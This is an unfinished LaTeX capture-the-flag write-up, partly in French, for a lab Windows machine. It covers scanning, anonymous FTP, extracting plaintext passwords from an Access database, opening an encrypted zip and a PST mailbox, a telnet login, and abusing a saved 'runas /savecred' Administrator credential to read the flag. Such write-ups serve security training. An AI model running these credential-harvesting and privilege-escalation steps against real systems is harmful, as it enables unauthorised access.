\chapter{Name}
\begin{itemize}
    \item {\bf technics}: DPAPI, credential manager 
    \item {\bf Components}: 
    \item {\bf tools}: mbd-tools, libpst
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
$ sudo nmap -sV -sC -oX access.xml 10.10.10.98
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 12:56 CEST
Nmap scan report for 10.10.10.98
Host is up (0.039s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
\end{verbatim}

\subsubsection{ftp}
on recupère 2 fichier

\begin{verbatim}
$ strings backup.mdb |more

Standard Jet DB
.. SNIP ..
AccLevelsetEmp
Delete personnel permissions informationX
UserInfo
Departments
Add DepartmentIT=
.. SNIP ..
backup_admin
admin
engineer
access4u@security
admin
.. SNIP ..

\end{verbatim}

\begin{verbatim}
$mdb-ver backup.mdb
JET4
\end{verbatim}

pose des soucis à lire avec les autre commandes il faut get en binary.

\begin{verbatim}
mdb-schema backup.mdb |grep user
.. SNIP ..
CREATE TABLE [auth_user]
.. SNIP ..


CREATE TABLE [auth_user]
 (
        [id]                    Long Integer,
# column id type 4
        [username]                      Text (100),
# column username type 10
        [password]                      Text (100),
# column password type 10
        [Status]                        Long Integer,
# column Status type 4
        [last_login]                    DateTime,
# column last_login type 8
        [RoleID]                        Long Integer,
# column RoleID type 4
        [Remark]                        Memo/Hyperlink (255)
# column Remark type 12
);

$ mdb-count backup.mdb auth_user
3
$ mdb-export backup.mdb auth_user
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
dd
\end{verbatim}

unzip produit une erreur 99 => passe à:
\begin{verbatim}
7z e control.zip
\end{verbatim}

fichier chiffré
\begin{verbatim}
$ zip2john control.zip > hash
$ john --wordlist=/usr/share/wordlists/passwords/rockyou.txt hash
\end{verbatim}
rien

en essayant le mdp \verb+access4u@security+
\begin{verbatim}
7z e control.zip
\end{verbatim}


\begin{verbatim}
$ readpst -D -8 control.pst
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
\end{verbatim}


\begin{verbatim}
The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.
Please ensure this is passed on to your engineers
\end{verbatim}

\subsubsection{http}

\subsection{Foothold}
\subsubsection{telnet}
\begin{verbatim}
# 4Cc3ssC0ntr0ller
ttelnet -l security 10.10.10.98

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>
C:\>cd Program Files (x86)

08/22/2018  08:23 AM    <DIR>          FPSensor

\end{verbatim}

\subsubsection{Stored credential}

dans \verb+C:\Users\Public\Desktop+ il y a un fichier \verb+.lnk+ qui fait
reférence a \verb+runas /savecred+ avec \verb+/user:ACCESS\Administrator+

donc on peut refaire un \verb+runas+ pour copier le flag ou l'on pourra le lire
ou lancer tout autre commande en tant qu'admin (nous donner des priv\ldots).

\begin{verbatim}
C:\temp>runas /user:ACCESS\Administrator /savecred 
    "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\temp\flag"
\end{verbatim}

\begin{verbatim}
\end{verbatim}

\section{Theorie}


